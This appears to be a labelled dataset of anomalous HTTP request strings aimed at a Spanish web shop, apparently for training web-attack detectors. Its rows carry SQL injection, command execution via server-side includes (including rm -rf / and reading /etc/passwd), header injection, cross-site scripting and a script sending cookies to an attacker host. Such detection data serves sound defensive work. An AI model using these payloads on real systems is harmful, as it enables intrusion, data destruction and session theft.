text,method,label
modo=registro&login=price&password=enlucimiento&nombre=Roldan&apellidos=Kisines+Selvas&email=sverdlin%40cortinasartesol.gl&dni=57845890Q&direccion=Muelle+Ca%F1onero+Dato%2C+S%2FN+6-G&ciudad=Luisiana%2C+La&cp=10811&provincia=Na.varra&ntc=1813562312950494&B1=Registrar,GET,anomalous
modo=registro&login=price&password=enlucimiento&nombre=Roldan&apellidos=Kisines+Selvas&email=sverdlin%40cortinasartesol.gl&dniA=57845890Q&direccion=Muelle+Ca%F1onero+Dato%2C+S%2FN+6-G&ciudad=Luisiana%2C+La&cp=10811&provincia=Palencia&ntc=1813562312950494&B1=Registrar,GET,anomalous
B2=Vaciar+carritoany%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235,GET,anomalous
B2=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C,GET,anomalous
modo=registro&login=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&password=c6r5FOL4o&nombre=Gilbr%E1n&apellidos=Villalobos+Busoms&email=gounaris-ressel%40bru%F1oseguridad.je&dni=94798155K&direccion=Carretera+Platja+Llarga+120%2C+1%3FC&ciudad=Casas+de+Ves&cp=33820&provincia=Cantabria&ntc=4169442426229834&B1=Registrar,GET,anomalous
modo=registro&login=merrili&password=c6r5FOL4o&nombre=Gilbr%E1n&apellidos=Villalobos+Busoms&email=gounaris-ressel%40bru%F1oseguridad.je&dniA=94798155K&direccion=Carretera+Platja+Llarga+120%2C+1%3FC&ciudad=Casas+de+Ves&cp=33820&provincia=Cantabria&ntc=4169442426229834&B1=Registrar,GET,anomalous
id=2&nombre=Ques%2Bo+Manchego&precio=39&cantidad=69&B1=A%F1adir+al+carrito,GET,anomalous
id=2&nombre=Vino+Rioja&precio=39&cantidadA=69&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=yansun&pwd=03s6ig89%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&remember=on&B1=Entrar,GET,anomalous
modo=entrar&login=yansun&pwd=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&remember=on&B1=Entrar,GET,anomalous
modo=entrar&login=yansun&pwd=%27emBOb%2Ca-%27Miento&remember=on&B1=Entrar,GET,anomalous
modo=insertar&precio=9805&B1=Pasar+por+caja,PUT,anomalous
modo=insertar&precio=9805&B1=Pasar+por+caja%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,GET,anomalous
modo=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=9805&B1=Pasar+por+caja,GET,anomalous
modo=insertar&precio=9805&B1=Confirmar%2F,GET,anomalous
modo=insertar&precioA=9805&B1=Pasar+por+caja,GET,anomalous
modo=registro&login=zumel&password=resalado&nombre=Wenceslada&apellidos=Bocachica+Barris&email=zigon%40%40%40callalelaboca.so&dni=16612973G&direccion=C%2F+Tomas+Perez%2C+130%2C+&ciudad=Santa+Maria+de+Palautordera&cp=44593&provincia=Almer%EDa&ntc=0177727308536638&B1=Registrar,GET,anomalous
modo=registro&login=zumel&passwordA=resalado&nombre=Wenceslada&apellidos=Bocachica+Barris&email=thebs-camoiras%40evelin.mq&dni=16612973G&direccion=C%2F+Tomas+Perez%2C+130%2C+&ciudad=Santa+Maria+de+Palautordera&cp=44593&provincia=Almer%EDa&ntc=0177727308536638&B1=Registrar,GET,anomalous
B2=%27INJECTED_PARAM,GET,anomalous
modo=registro&login=dirienzo&password=HacEdOr&nombre=Geraldo&apellidos=Turra+Clop%E9s&email=fang_lavanant%40infotek.gu&dni=39243664Y&direccion=Calle+Tres+Marias%2C+103+&ciudad=Uterga%2B&cp=28980&provincia=Zaragoza&ntc=7982155754096924&B1=Registrar,GET,anomalous
modo=registro&login=dirienzo&password=HacEdOr&nombre=Geraldo&apellidos=Turra+Clop%E9s&email=fang_lavanant%40infotek.gu&dni=39243664Y&direccion=Calle+Tres+Marias%2C+103+&ciudad=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&cp=28980&provincia=Zaragoza&ntc=7982155754096924&B1=Registrar,GET,anomalous
modo=registro&login=dirienzo&password=HacEdOr&nombre=Geraldo&apellidosA=Turra+Clop%E9s&email=fang_lavanant%40infotek.gu&dni=39243664Y&direccion=Calle+Tres+Marias%2C+103+&ciudad=Uterga&cp=28980&provincia=Zaragoza&ntc=7982155754096924&B1=Registrar,GET,anomalous
id=2&nombre=Queso+Manchego&precio=85&cantidad=58AND+1%3D1&B1=A%F1adir+al+carrito,GET,anomalous
id=2&nombre=Queso+Manchego&precio=85&cantidad=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=wolfie8&pwd=antagallar&remember=off&B1=Entrar%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,GET,anomalous
modo=entrar&login=%2B&pwd=antagallar&remember=off&B1=Entrar,GET,anomalous
modo=entrar&login=wolfie8&pwd=on%2F9%2Cg%27784iea&remember=off&B1=Entrar,GET,anomalous
modo=entrar&login=wolfie8&pwd=antagallar&remember=off&B1A=Entrar,GET,anomalous
id=1%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,GET,anomalous
Open,GET,anomalous
errorMsg=%253F,GET,anomalous
modo=insertar&precio=588&B1=Pasar+por+cajaparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2,GET,anomalous
modo=insertar&precio=588&B1=Confirmar%2F,GET,anomalous
modo=insertar&precio=588&B1A=Pasar+por+caja,GET,anomalous
modo=registro&login=poh-soon&password=4hicue84&nombre=Asad&apellidos=Serralta+Calzina&email=urecel%40elbauldelosrefranes.ky&dni=30292866A&direccion=Carrer+Bonsucces+144+&ciudad=Sotillo%2C+El&cp=19442&provincia=H.uesca&ntc=5175468282615613&B1=Registrar,GET,anomalous
modo=registro&login=poh-soon&password=4hicue84&nombre=Asad&apellidos=Serralta+Calzina&email=urecel%40elbauldelosrefranes.ky&dniA=30292866A&direccion=Carrer+Bonsucces+144+&ciudad=Sotillo%2C+El&cp=19442&provincia=Soria&ntc=5175468282615613&B1=Registrar,GET,anomalous
modo=registro&login=carolina&password=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&nombre=Ihor&apellidos=M%FAgica+Vall%E9s&email=urecal8%40espanolynegocios.bu&dni=67961648Y&direccion=Av.+Olimpica%2C+156+&ciudad=Navajas&cp=43941&provincia=Madrid&ntc=2515177122592288&B1=Registrar,GET,anomalous
modo=registro&login=carolina&password=paRtICUlaridaD&nombre=Ihor&apellidos=M%FAgica+Vall%E9s&email=urecal8%40espanolynegocios.bu&dni=67961648Y&direccion=Av.+Olimpica%2C+156+&ciudad=Navajas&cp=43941&provincia=Madrid&ntc=174250683685812&B1=Registrar,GET,anomalous
modo=registro&login=carolina&password=paRtICUlaridaD&nombre=Ihor&apellidos=M%FAgica+Vall%E9s&email=urecal8%40espanolynegocios.bu&dni=67961648Y&direccion=Av.+Olimpica%2C+156+&ciudadA=Navajas&cp=43941&provincia=Madrid&ntc=2515177122592288&B1=Registrar,GET,anomalous
id=2&nombre=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=85&cantidad=18&B1=A%F1adir+al+carrito,GET,anomalous
id=2&nombre=Queso+Manchego&precio=85%2F&cantidad=18&B1=A%F1adir+al+carrito,GET,anomalous
id=2&nombre=Queso+Manchego&precio=85&cantidadA=18&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=freeburn&pwd=florar&remember=off%2500&B1=Entrar,GET,anomalous
modoA=entrar&login=freeburn&pwd=florar&remember=off&B1=Entrar,GET,anomalous
modo=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=4564&B1=Confirmar,GET,anomalous
modo=insertar&precio=4564&B1=Confirmar%2F,GET,anomalous
modo=insertar&precioA=4564&B1=Confirmar,GET,anomalous
modo=registro&login=jowett&password=2%CD082Es&nombre=Malco&apellidos=Fresquet+Giuggia&email=moriaty.suchima%40vendomiatico.at&dni=34012270P&direccion=C%2F+Codigo+Apartados+Particulares+Oficiales+y+Lista+94%2C+3%3FE&ciudad=Vall+de*.+Card%F3s&cp=09613&provincia=Salamanca&ntc=1543672181801522&B1=Registrar,GET,anomalous
modo=registro&login=jowett&password=2%CD082Es&nombre=Malco&apellidos=Fresquet+Giuggia&email=moriaty.suchima%40vendomiatico.at&dni=34012270P&direccionA=C%2F+Codigo+Apartados+Particulares+Oficiales+y+Lista+94%2C+3%3FE&ciudad=Benaoj%E1n&cp=09613&provincia=Salamanca&ntc=1543672181801522&B1=Registrar,GET,anomalous
modo=registro&login=pattin&password=48h817n7&nombre=Tr%E1nsito&apellidos=Camorlinga+Aragon%E8s&email=boehm%40zeat.bo+&dni=67474361C&direccion=Alvar+Garcia%2C+S%2FN%2C+&ciudad=Gav%E0&cp=06413&provincia=Toledo&ntc=2637703097461568&B1=Registrar,GET,anomalous
modo=registro&login=pattin&password=48h817n7&nombre=Tr%E1nsito&apellidos=Camorlinga+Aragon%E8s&email=boehm%40zeat.bo&dni=67474361C&direccion=Praza*+Crucero+De+Cani*do*+144+9%3FG&ciudad=Gav%E0&cp=06413&provincia=Toledo&ntc=2637703097461568&B1=Registrar,GET,anomalous
modo=registro&login=pattin&password=48h817n7&nombre=Tr%E1nsito&apellidos=Camorlinga+Aragon%E8s&emailA=boehm%40zeat.bo&dni=67474361C&direccion=Alvar+Garcia%2C+S%2FN%2C+&ciudad=Gav%E0&cp=06413&provincia=Toledo&ntc=2637703097461568&B1=Registrar,GET,anomalous
id=3&nombre=Queso+Manchego&precio=85&cantidad=17&B1=A%F1adir+al+carrito%257C,GET,anomalous
id=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Queso+Manchego&precio=85&cantidad=17&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombre=Queso+Manchego&precioA=85&cantidad=17&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=%2Bmombour%2C%3Fq&pwd=granoto&remember=on&B1=Entrar,GET,anomalous
modoA=entrar&login=lawther&pwd=granoto&remember=on&B1=Entrar,GET,anomalous
modo=insertar&precio=8421&B1=Pasar+por+caja%2F,GET,anomalous
modo=insertar&precioA=8421&B1=Confirmar,GET,anomalous
modo=registro&login=%2Bvonnie&password=lLaNiSca&nombre=Onella&apellidos=Wiedeman+Nal%F3n&email=sirichanya%40vinavilano.pe&dni=97036086Y&direccion=Calle+Yela+Utrilla+150+&ciudad=Villanueva+del+Trabuco&cp=37450&provincia=M%E1laga&ntc=3862460916827849&B1=Registrar,GET,anomalous
modo=registro&login=ault&password=lLaNiSca&nombre=Onella&apellidos=Wiedeman+Nal%F3n&email=sirichanya%40vinavilano.pe&dni=97036086Y&direccion=Calle+Yela+Utrilla+150+&ciudad=Villanueva+del+Trabuco&cp=37450&provincia=M%E1laga&ntc=3862460916827849&B1A=Registrar,GET,anomalous
modo=registro&login=malina6&password=ami3os&nombre=Sharim&apellidos=Novell+Abenoza%2520&email=tanimoto_hassen%40autobuses-hibridos.tw&dni=62773463T&direccion=Matarrosa+103+&ciudad=Campos&cp=16760&provincia=Girona&ntc=6063512360639873&B1=Registrar,GET,anomalous
modo=registro&login=malina6&password=ami3os&nombre=Sharim&apellidos=Novell+Abenoza&email=tanimoto_hassen%40autobuses-hibridos.tw&dni=62773463T&direccion=Matarrosa+103+&ciudad=Campos&cp=16760&provincia=Girona&ntc=076139709096347&B1=Registrar,GET,anomalous
modo=registro&login=malina6&password=ami3os&nombre=Sharim&apellidos=Novell+Abenoza&email=tanimoto_hassen%40autobuses-hibridos.tw&dniA=62773463T&direccion=Matarrosa+103+&ciudad=Campos&cp=16760&provincia=Girona&ntc=6063512360639873&B1=Registrar,GET,anomalous
id=1&nombre=Vino+Rioja&precio=85&cantidad=76%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&B1=A%F1adir+al+carrito,GET,anomalous
id=1&nombre=Ques%2Bo+Manchego&precio=85&cantidad=76&B1=A%F1adir+al+carrito,GET,anomalous
id=1&nombreA=Vino+Rioja&precio=85&cantidad=76&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=laforgesessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&pwd=o1R8me956&remember=off&B1=Entrar,GET,anomalous
modo=entrar&login=laforge&pwd=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&remember=off&B1=Entrar,GET,anomalous
modo=entrar&login=laforge&pwd=o1R8me956&remember=off%2F&B1=Entrar,GET,anomalous
modo=entrar&loginA=laforge&pwd=o1R8me956&remember=off&B1=Entrar,GET,anomalous
id=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,GET,anomalous
modo=insertarany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&precio=8789&B1=Confirmar,GET,anomalous
modo=insertar&precio=8789&B1=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,GET,anomalous
modo=insertar&precio=8789&B1=Confirmar%2F,GET,anomalous
modo=insertar&precio=8789&B1A=Confirmar,GET,anomalous
modo=registro&login=hinda&password=ubre&nombre=Riley&apellidos=Penichet+Forales&email=andersson.millan%40salacomplices.bs&dni=51920905S&direccion=%4040&ciudad=Xinzo+de+Limia&cp=37592&provincia=Le%F3n&ntc=5072758517881652&B1=Registrar,GET,anomalous
modo=registro&login=hinda&password=185eMBA%2Fr9a%2C%27R&nombre=Riley&apellidos=Penichet+Forales&email=andersson.millan%40salacomplices.bs&dni=51920905S&direccion=Avenida+De+La+Hierbabuena%2C+33%2C+&ciudad=Xinzo+de+Limia&cp=37592&provincia=Le%F3n&ntc=5072758517881652&B1=Registrar,GET,anomalous
modo=registro&login=hinda&password=ubre&nombre=Riley&apellidos=Penichet+Forales&email=andersson.millan%40salacomplices.bs&dni=51920905S&direccionA=Avenida+De+La+Hierbabuena%2C+33%2C+&ciudad=Xinzo+de+Limia&cp=37592&provincia=Le%F3n&ntc=5072758517881652&B1=Registrar,GET,anomalous
modo=registro&login=melonie&password=ad1168n77&nombre=Dulio&apellidos=Ubach+Rodr%EDguez&email=wilmot%40schnaps.com.ne&dni=87584326G&direccion=C%2F+Lara%2C+162+&ciudad=Villanueva+de+Campe%E1n&cp=01423&provincia=Barcelona%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&ntc=5124736256894307&B1=Registrar,GET,anomalous
modo=registro&login=melonie&password=ad1168n77&nombre=Dulio&apellidos=Ubach+Rodr%EDguez&email=wilmot%40schnaps.com.ne&dni=87584326G&direccion=C%2F+Lara%2C+162+&ciudad=Villanueva+de+Campe%E1n&cp=%22+AND+%221%22%3D%221&provincia=Barcelona&ntc=5124736256894307&B1=Registrar,GET,anomalous
modo=registro&login=melonie&password=ad1168n77&nombre=Dulio&apellidos=Ubach+Rodr%EDguez&email=wilmot%40schnaps.com.ne&dni=87584326G&direccion=C%2F+Lara%2C+162+&ciudad=Villanueva+de+Campe%E1n&cp=01423&provinciaA=Barcelona&ntc=5124736256894307&B1=Registrar,GET,anomalous
id=2&nombre=Vino+Rioja&precio=100Set-cookie%253A%2BTamper%253D1041264011025374727&cantidad=18&B1=A%F1adir+al+carrito,GET,anomalous
id=2&nombre=Vino+Rioja&precio=100&cantidad=%3F&B1=A%F1adir+al+carrito,GET,anomalous
id=2&nombre=Vino+Rioja&precio=85%2F&cantidad=18&B1=A%F1adir+al+carrito,GET,anomalous
id=2&nombreA=Vino+Rioja&precio=100&cantidad=18&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&pwd=COnSO0atiVO&remember=on&B1=Entrar,GET,anomalous
modo=entrar&login=ke%2B%3Fv%3Fen&pwd=COnSO0atiVO&remember=on&B1=Entrar,GET,anomalous
errorMsg=Credenciales+incorrectas%27+AND+%271%27%3D%271,GET,anomalous
modo=insertar&precio=2103&B1=Confirmar%2F,GET,anomalous
modo=insertar&precioA=2103&B1=Pasar+por+caja,GET,anomalous
modo=registro&login=charlesb&password=m96fan19&nombre=Durante&apellidos=Campusano+Caldero&email=gheorghiu-battaglia%40sanchezgordo.bt&dni=44335499D&direccion=C%2F+Padre+Luis+Maria+Arteche+0+5B&ciudad=Palma+de+Mallorca&cp=37716&provincia=Cantabria%2B&ntc=6556979183874771&B1=Registrar,GET,anomalous
modo=registro&login=charlesb&password=m96fan19&nombre=Durante&apellidos=Campusano+Caldero&email=gheorghiu-battaglia%40sanchezgordo.bt&dni=44335499D&direccion=C%2F+Padre+Luis+Maria+Arteche+0+5B&ciudad=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&cp=37716&provincia=Cantabria&ntc=6556979183874771&B1=Registrar,GET,anomalous
modo=registro&loginA=charlesb&password=m96fan19&nombre=Durante&apellidos=Campusano+Caldero&email=gheorghiu-battaglia%40sanchezgordo.bt&dni=44335499D&direccion=C%2F+Padre+Luis+Maria+Arteche+0+5B&ciudad=Palma+de+Mallorca&cp=37716&provincia=Cantabria&ntc=6556979183874771&B1=Registrar,GET,anomalous
modo=registro&login=han-fei&password=esPUeNdA&nombre=%3FBa.s-iana&apellidos=Barril+Scifo&email=noel-noel.abel-gance%40videocasa-ebs.yu&dni=88159654X&direccion=Calle+Luis+i+165+10A&ciudad=Castrillo+de+la+Guare%F1a&cp=43830&provincia=Albacete&ntc=6015225993356578&B1=Registrar,GET,anomalous
modoA=registro&login=han-fei&password=esPUeNdA&nombre=Sartino&apellidos=Barril+Scifo&email=noel-noel.abel-gance%40videocasa-ebs.yu&dni=88159654X&direccion=Calle+Luis+i+165+10A&ciudad=Castrillo+de+la+Guare%F1a&cp=43830&provincia=Albacete&ntc=6015225993356578&B1=Registrar,GET,anomalous
id=3&nombre=Jam%F3n+Ib%E9rico&precio=100%2F&cantidad=38&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidadA=38&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=kenkel&pwd=ad5er4r%2500&remember=on&B1=Entrar,GET,anomalous
modo=entrar&login=kenkel&pwd=%2520&remember=on&B1=Entrar,GET,anomalous
modo=entrar&login=kenkel&pwd=ad5er4r&remember=on%2F&B1=Entrar,GET,anomalous
modo=entrar&login=kenkel&pwd=ad5er4r&rememberA=on&B1=Entrar,GET,anomalous
modo=insertar&precio=9168%257C&B1=Confirmar,GET,anomalous
modo=insertar&precio=9168&B1=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,GET,anomalous
modo=insertar&precio=9168&B1=Confirmar%2F,GET,anomalous
modoA=insertar&precio=9168&B1=Confirmar,GET,anomalous
modo=%7C&login=denna&password=89S0R56Gl8&nombre=Reynard&apellidos=H%E9rard&email=bardy%40busquedadeempleo.mw&dni=18720571C&direccion=Ordo%F1ez+31%2C+4%3FG&ciudad=Vinuesa&cp=50584&provincia=Zaragoza&ntc=0820484159407817&B1=Registrar,GET,anomalous
modo=registro&login=denna&password=89S0R56Gl8&nombre=Deni%3F%27%3Fce&apellidos=H%E9rard&email=bardy%40busquedadeempleo.mw&dni=18720571C&direccion=Ordo%F1ez+31%2C+4%3FG&ciudad=Vinuesa&cp=50584&provincia=Zaragoza&ntc=0820484159407817&B1=Registrar,GET,anomalous
modo=registro&loginA=denna&password=89S0R56Gl8&nombre=Reynard&apellidos=H%E9rard&email=bardy%40busquedadeempleo.mw&dni=18720571C&direccion=Ordo%F1ez+31%2C+4%3FG&ciudad=Vinuesa&cp=50584&provincia=Zaragoza&ntc=0820484159407817&B1=Registrar,GET,anomalous
B2=Vaciar+carritoAND+1%3D1,GET,anomalous
modo=registro&login=mau%2Brino&password=Desaprovedhosa&nombre=Guy&apellidos=Peruyero+Danis&email=sundbery-vonic%40castigado.tf&dni=61857027E&direccion=C%2F+Jose+Maria+Pereda%2C+49+&ciudad=Chodes&cp=12319&provincia=Albacete&ntc=8340633556666736&B1=Registrar,GET,anomalous
modo=registro&login=eiko&password=Desaprovedhosa&nombre=Guy&apellidos=Peruyero+Danis&email=sundbery-vonic%40castigado.tf&dni=61857027E&direccion=C%2F+Jose+Maria+Pereda%2C+49+&ciudad=Chodes&cpA=12319&provincia=Albacete&ntc=8340633556666736&B1=Registrar,GET,anomalous
id=3&nombre=Jam%F3n+Ib%E9rico&precio=85paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&cantidad=34&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombre=Jam%F3n+Ib%E9rico&precio=Set-cookie%253A%2BTamper%253D1041264011025374727&cantidad=34&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombre=Jam%F3n+Ib%E9rico&precio=100%2F&cantidad=34&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombreA=Jam%F3n+Ib%E9rico&precio=85&cantidad=34&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=rocio4&pwd=acreCenTA%21Dora&remember=onany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=Entrar,GET,anomalous
modo=entrar&login=rocio4&pwd=deSm%27Elar&remember=on&B1=Entrar,GET,anomalous
errorMsg=Credenciales+incorrectas%2B,GET,anomalous
modo=insertar&precio=1510&B1=Confirmar,PUT,anomalous
modo=insertar&precio=1510%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&B1=Confirmar,GET,anomalous
modo=%3F&precio=1510&B1=Confirmar,GET,anomalous
modo=insertar&precio=1510&B1=Confirmar%2F,GET,anomalous
modo=insertar&precio=1510&B1A=Confirmar,GET,anomalous
modo=registro&login=tarle&password=8ar0enaDor&nombre=Romildo&apellidos=Decaralt+Melero&email=nye%40intg.ws&dni=%27961066AD&direccion=Pl.+De+La+Muralla+Liberal+169+2%3FB&ciudad=Almensilla&cp=47513&provincia=Girona&ntc=9922927157537340&B1=Registrar,GET,anomalous
modo=registro&login=tarle&password=8ar0enaDor&nombre=Romildo&apellidos=Decaralt+Melero&email=nye%40intg.ws&dni=92321751G&direccion=Pl.+De+La+Muralla+Liberal+169+2%3FB&ciudadA=Almensilla&cp=47513&provincia=Girona&ntc=9922927157537340&B1=Registrar,GET,anomalous
B2=Vaciar+carrito%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,GET,anomalous
B2=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,GET,anomalous
modo=registro&login=bennet&password=%2496c5sa&nombre=Sid&apellidos=Echegoyen+Pazar%E1n&email=senghor-golling3%4024htranslations.ht&dni=16864786J&direccion=Barriada+De+La+Doctora+15+&ciudad=Roa&cp=03610%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&provincia=Valladolid&ntc=0695001148270797&B1=Registrar,GET,anomalous
id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=65&B1=A%F1adir+al+carrito,PUT,anomalous
id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=65&B1=A%F1adir+al+carrito%27+DELETE+FROM+USERS,GET,anomalous
id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=+&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombre=Ques%2Bo+Manchego&precio=39&cantidad=65&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombre=Jam%F3n+Ib%E9rico&precioA=39&cantidad=65&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=ada&pwd=desmocadero&remember=on&B1=Entrar,PUT,anomalous
modo=%4040&login=ada&pwd=desmocadero&remember=on&B1=Entrar,GET,anomalous
modo=entrar&login=ada&pwd=desmocadero&remember=on&B1A=Entrar,GET,anomalous
id=1%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25,GET,anomalous
modo=insertar&precio=350&B1=Confirmar%2F,GET,anomalous
modo=insertar&precioA=350&B1=Confirmar,GET,anomalous
modo=registro&login=hobin&password=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&nombre=Abinahil&apellidos=Gorostiza+Jorge&email=bradford.bontempo%40informex.tr&dni=80243620R&direccion=Pl.+Salesas+18+&ciudad=Gombr%E8n&cp=44652&provincia=Valladolid&ntc=7032918992932037&B1=Registrar,GET,anomalous
modo=registro&login=hobin&password=%2Fo%2Cbnoxi%2Fo&nombre=Abinahil&apellidos=Gorostiza+Jorge&email=bradford.bontempo%40informex.tr&dni=80243620R&direccion=Pl.+Salesas+18+&ciudad=Gombr%E8n&cp=44652&provincia=Valladolid&ntc=7032918992932037&B1=Registrar,GET,anomalous
modo=registro&login=hobin&password=desacordante&nombreA=Abinahil&apellidos=Gorostiza+Jorge&email=bradford.bontempo%40informex.tr&dni=80243620R&direccion=Pl.+Salesas+18+&ciudad=Gombr%E8n&cp=44652&provincia=Valladolid&ntc=7032918992932037&B1=Registrar,GET,anomalous
modo=registro&login=dorise&password=anv5r14&nombre=Adelmo&apellidos=Escoda+Begazo&email=skobline%40promotorareina.no&dni=36354909M&direccion=C%2F+Matasiete%2C+26%2C+2-H&ciudad=%22+AND+%221%22%3D%221&cp=42269&provincia=Palencia&ntc=0173606595958509&B1=Registrar,GET,anomalous
modo=registro&login=dorise&password=anv5r14&nombre=Adelmo&apellidos=Escoda+Begazo&email=skobline%40promotorareina.no&dni=36354909M&direccion=Pare+Gallifa%2C+*82%2C+&ciudad=Torre+d%27En+Besora%2C+la&cp=42269&provincia=Palencia&ntc=0173606595958509&B1=Registrar,GET,anomalous
id=1&nombre=Queso+Manchego&precio=39%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&cantidad=94&B1=A%F1adir+al+carrito,GET,anomalous
id=1&nombre=Ques%2Bo+Manchego&precio=39&cantidad=94&B1=A%F1adir+al+carrito,GET,anomalous
id=1&nombre=Queso+Manchego&precioA=39&cantidad=94&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=alvarez&pwd=9ec828%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&remember=on&B1=Entrar,GET,anomalous
modo=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&login=alvarez&pwd=9ec828&remember=on&B1=Entrar,GET,anomalous
modo=entrar&login=%2Clynde&pwd=9ec828&remember=on&B1=Entrar,GET,anomalous
modo=entrar&login=alvarez&pwd=9ec828&remember=on&B1A=Entrar,GET,anomalous
id=2bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,GET,anomalous
id=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,GET,anomalous
modo=insertar%27OR%27a%3D%27a&precio=5756&B1=Pasar+por+caja,GET,anomalous
